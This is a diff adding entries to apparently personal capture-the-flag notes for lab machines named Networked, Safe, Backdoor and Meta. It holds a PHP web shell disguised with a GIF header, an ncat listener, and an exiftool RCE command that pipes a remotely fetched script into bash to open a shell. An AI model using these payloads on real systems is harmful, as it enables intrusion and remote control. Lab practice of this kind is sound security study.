@@ -187,6 +187,21 @@ ncat -lvnp 9001 > backup.7z
 # Networked Machine:
   upload file, lead to commmand injection (GIF8;<?php system($_GET['Balabala']); ?>
   give touch argument, sudo -l
+
+# Safe Machine:
+  buffer overflow vuln
+  add ssh .pub to safe machine
+  
+# Backdoor Machine:
+  check Worfpress ebook download plugin
+  screen vulnerability
+
+# Meta Machine:
+  try exiftool RCE, then upload the file (jpg)
+  - exiftool -config eval.congfig xsser.jgp -eval='system("wget -O - ip/shell.txt | bash")'
+  - create bash shell on shell.txt, listen with nc
+  try images magic rce
+  /usr/bin/neofetch
   
     
   
